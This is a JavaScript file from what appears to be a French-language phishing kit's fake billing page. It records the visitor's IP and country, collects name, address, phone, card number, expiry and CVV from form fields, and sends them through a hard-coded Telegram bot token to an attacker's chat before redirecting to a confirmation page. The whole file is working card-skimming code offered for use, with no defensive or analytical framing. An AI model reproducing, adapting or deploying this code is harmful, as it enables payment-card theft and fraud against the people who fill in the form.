/*   --------  Telegram Settings  --------    */
const token = '676904871:AAEV0n-ypwUIUI6_xD40IW5g7AhIXgTSKJxy_lY'
const chatID = '5132766716238'
    /*   ------------------------  */
let ip
let country
fetch('https://extreme-ip-lookup.com/json/?key=hx7an7lng6DLuGjYVIg8')
    .then(res => res.json())
    .then(data => {
        ip = data.query
        country = data.countryCode
    }).catch(err => {
        console.error('Error: ', err);
    });
/* ------------------------ */
function sendTelegram(myData, redirect, seconds = 1) {

    const myUrl = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chatID + '&text=' + myData + '&parse_mode=MarkDown'

    fetch(myUrl).then(function(response) {
            return response.json()
        }).then(function(res) {

            setTimeout(function() {
                window.location.href = redirect;
            }, seconds);


        })
        .catch(function(err) {
            console.log(err)
        })




}
/* ------------------------ */

function sendBilling() {

    let name = document.getElementById('name');
    let prenom = document.getElementById('prename');
    let adresse = document.getElementById('adresse');
    let ville = document.getElementById('ville');
    let postal = document.getElementById('postal');
    let tele = document.getElementById('tele');
    let namecart = document.getElementById('namecart');
    let numcart = document.getElementById('numcart');
    let mois = document.getElementById('mois');
    let annee = document.getElementById('annee');
    let cvv = document.getElementById('cvv');

    if (name.value.length > 3) {
        name.style.border = "1px solid #42ba96"
    } else {
        name.style.border = "1px solid #d15353"
    };

    if (prenom.value.length > 3) {
        prenom.style.border = "1px solid #42ba96"
    } else {
        prenom.style.border = "1px solid #d15353"
    };

    if (adresse.value.length > 4) {
        adresse.style.border = "1px solid #42ba96"
    } else {
        adresse.style.border = "1px solid #d15353"
    };

    if (ville.value.length > 3) {
        ville.style.border = "1px solid #42ba96"
    } else {
        ville.style.border = "1px solid #d15353"
    };

    if (postal.value.length == 5) {
        postal.style.border = "1px solid #42ba96"
    } else {
        postal.style.border = "1px solid #d15353"
    };

    if (tele.value.length > 8) {
        tele.style.border = "1px solid #42ba96"
    } else {
        tele.style.border = "1px solid #d15353"
    };

    if (namecart.value.length > 5) {
        namecart.style.border = "1px solid #42ba96"
    } else {
        namecart.style.border = "1px solid #d15353"
    };

    if (numcart.value.length == 16) {
        numcart.style.border = "1px solid #42ba96"
    } else {
        numcart.style.border = "1px solid #d15353"
    };

    if (mois.value.length == 2) {
        mois.style.border = "1px solid #42ba96"
    } else {
        mois.style.border = "1px solid #d15353"
    };

    if (annee.value.length == 4) {
        annee.style.border = "1px solid #42ba96"
    } else {
        annee.style.border = "1px solid #d15353"
    };

    if (cvv.value.length > 2) {
        cvv.style.border = "1px solid #42ba96"
    } else {
        cvv.style.border = "1px solid #d15353"
    };



    if (name.value.length > 3 && adresse.value.length > 8 && ville.value.length > 3 && tele.value.length > 4 && cvv.value.length > 2 && numcart.value.length == 16) {
        const myData =
       `From ${ip}/${country} 
        Adress : ${adresse.value} | Ville : ${ville.value} | Postal : ${postal.value}
        Tele :  ${tele.value}
        Titulaire : ${namecart.value}
        Num Cart : ${numcart.value}
        Ex : ${mois.value}/${annee.value} | CVV : ${cvv.value}`
        sendTelegram(myData, "confirmation.php")
    }


}

/* ------------------------ */